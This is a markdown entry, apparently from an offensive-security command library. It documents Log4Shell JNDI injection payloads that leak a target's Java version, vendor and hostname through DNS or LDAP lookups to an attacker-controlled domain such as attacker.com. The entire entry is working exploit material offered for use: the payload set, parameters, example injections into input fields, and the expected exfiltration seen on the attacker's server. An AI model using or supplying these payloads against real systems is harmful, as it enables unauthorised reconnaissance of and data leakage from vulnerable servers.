---
type: command
executor: injection
data: |
  ${jndi:ldap://${java:version}.domain/a}
  ${jndi:ldap://${env:JAVA_VERSION}.domain/a}
  ${jndi:ldap://${sys:java.version}.domain/a}
  ${jndi:ldap://${sys:java.vendor}.domain/a}
  ${jndi:ldap://${hostName}.domain/a}
  ${jndi:dns://${hostName}.domain}
output: null
platforms:
  - Java
  - Web
tags:
  - log4shell
  - enumeration
verified: true
validated: true
---

# log4shell-jndi-lookup-java-version-hostname

## Command

```injection
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}
```

## Description

This payload set injects JNDI lookup strings to enumerate Java runtime version, vendor, and system hostname from a Log4Shell-vulnerable application. Each string triggers a remote lookup that appends the property value to a DNS or LDAP query, leaking the information to an attacker-controlled resolver.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Attacker-controlled domain for DNS/LDAP resolution (e.g., attacker.com) | Yes |
| ldap:// | Protocol for directory lookup (alternative: rmi:// for Java RMI) | No |
| dns:// | Protocol for DNS resolution (lighter alternative to LDAP) | No |

## Examples

### Basic Usage

Inject into a vulnerable input field:
```injection
${jndi:ldap://${java:version}.attacker.com/a}
```

### Advanced Usage

Test multiple properties in sequence:
```injection
${jndi:ldap://${sys:java.version}.attacker.com/a} ${jndi:dns://${hostName}.attacker.com}
```

## Expected Output

On attacker DNS/LDAP server: Incoming queries like '1.8.0_292.attacker.com' (Java version) or 'target-host.attacker.com' (hostname). In app response: Potential error messages echoing the property if resolution fails.

## Related

- [[procedures/Enumerate-Information-via-Log4Shell-JNDI-Lookups]]
- [[commands/log4shell-jndi-lookup-environment-variables]]
